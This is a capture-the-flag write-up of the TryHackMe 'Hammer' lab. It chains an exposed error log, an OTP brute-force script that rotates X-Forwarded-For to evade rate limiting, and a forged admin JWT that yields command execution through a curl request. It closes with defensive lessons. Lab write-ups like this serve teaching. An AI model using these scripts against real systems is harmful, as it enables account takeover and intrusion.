# 🔨 Hammer

| Field | Details |
|---|---|
| **Platform** | TryHackMe |
| **Room** | [Hammer](https://tryhackme.com/room/hammer) |
| **Difficulty** | 🟡 Medium |
| **Category** | Web |
| **OS** | Linux |
| **Tools** | nmap, ffuf, Burp Suite, curl, Python, jwt.io, Ghidra |

---

## 🎯 Objective

Chain 5 vulnerabilities — email discovery via exposed logs, OTP brute force bypassing rate limiting, and JWT `kid` parameter injection for RCE.

---

## 🔍 Reconnaissance

```bash
nmap -sC -sV TARGET_IP
```

**Open ports:**
```
22/tcp   open  ssh
1337/tcp open  http   Apache 2.4.41
```

Directory fuzzing — the HTML source reveals a naming pattern `hmr_*`:

```bash
ffuf -u http://TARGET_IP:1337/FUZZ \
  -w /usr/share/wordlists/dirb/common.txt
```

**Found:** `/hmr_logs/` directory with an exposed `error.log` file:

```bash
curl http://TARGET_IP:1337/hmr_logs/error.log
# Contains: tester@hammer.thm
```

**Email found:** `tester@hammer.thm`

---

## 💥 Exploitation — Rate Limit Bypass + OTP Brute Force

The password reset page sends a 4-digit OTP. The rate limiter is keyed on the `X-Forwarded-For` header — rotate it per request to bypass:

```python
import requests

url = "http://TARGET_IP:1337/reset_password.php"

for code in range(0000, 10000):
    xff = f"1.1.1.{code % 256}"
    headers = {"X-Forwarded-For": xff}
    data = {
        "email": "tester@hammer.thm",
        "recovery_code": str(code).zfill(4),
        "s": "180"   # timer bypass via hidden field
    }
    r = requests.post(url, data=data, headers=headers)
    if "Invalid" not in r.text and "try again" not in r.text.lower():
        print(f"[+] Code found: {code}")
        break
```

Password reset successful — new password set, login to dashboard.

---

## 🔑 JWT `kid` Parameter Injection → RCE

After login a JWT is issued. Inspect at jwt.io:

```json
Header: {
  "typ": "JWT",
  "alg": "HS256",
  "kid": "/var/www/mykey.key"
}
Payload: {
  "role": "user",
  "user_id": 1,
  "email": "tester@hammer.thm"
}
```

The `kid` (Key ID) points to a file path on the server. The dashboard also reveals a downloadable file `188ade1.key` in the web root:

```bash
wget http://TARGET_IP:1337/188ade1.key
cat 188ade1.key
# This is the HMAC signing secret
```

Forge an admin JWT signed with the discovered key:

```python
import jwt

secret = open("188ade1.key").read().strip()

payload = {
    "iss": "http://hammer.thm",
    "aud": "http://hammer.thm",
    "iat": 1700000000,
    "exp": 1700086400,
    "data": {
        "user_id": 1,
        "email": "tester@hammer.thm",
        "role": "admin"
    }
}

header = {
    "typ": "JWT",
    "alg": "HS256",
    "kid": "/var/www/html/188ade1.key"
}

token = jwt.encode(payload, secret, algorithm="HS256", headers=header)
print(token)
```

Submit the forged JWT as `Authorization: Bearer` header to execute commands:

```bash
curl -s http://TARGET_IP:1337/dashboard.php \
  -H "Authorization: Bearer FORGED_TOKEN" \
  -d "cmd=cat /home/ubuntu/flag.txt"
```

**Flag captured.**

---

## 📚 Lessons Learned

- Rate limiting on `X-Forwarded-For` is trivially bypassed — always rate limit on `REMOTE_ADDR`
- JWT `kid` pointing to a file path allows an attacker to control the signing key — validate `kid` against an allowlist
- Never store secret key files inside the web root — they can be downloaded directly
- The vulnerability chain: log exposure → email → OTP bypass → JWT `kid` injection → RCE

---
*by OwlRC 🦉 | github.com/OwlRC*
